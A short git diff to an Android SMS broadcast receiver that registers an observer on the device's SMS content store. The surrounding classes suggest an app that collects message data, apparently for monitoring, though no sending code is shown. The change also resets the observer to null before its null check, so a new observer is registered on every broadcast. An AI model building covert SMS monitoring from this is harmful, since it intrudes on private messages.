@@ -16,8 +16,8 @@ import android.preference.PreferenceManager;
 import android.telephony.SmsMessage;
 import android.util.Log;
 
-import com.inet.android.bs.RequestMakerImpl;
 import com.inet.android.request.DataRequest;
+import com.inet.android.request.RequestMakerImpl;
 import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
 import com.inet.android.utils.WorkTimeDefiner;
@@ -58,15 +58,14 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 
 		try {
 			mBundle = intent.getExtras();
-			// smsSentObserver = null;
-			Log.d(TAG, "Intent Action : " + intent.getAction());
-
+			smsSentObserver = null;
+		
 			if (smsSentObserver == null) {
 				smsSentObserver = new SmsSentObserver(new Handler(), mContext);
 				mContext.getContentResolver().registerContentObserver(
 						Uri.parse("content://sms"), true, smsSentObserver);
 			}
-			getSMSDetails();
+						
 
 		} catch (Exception sgh) {
 			Logging.doLog(TAG, "Error in Init : " + sgh.toString(),
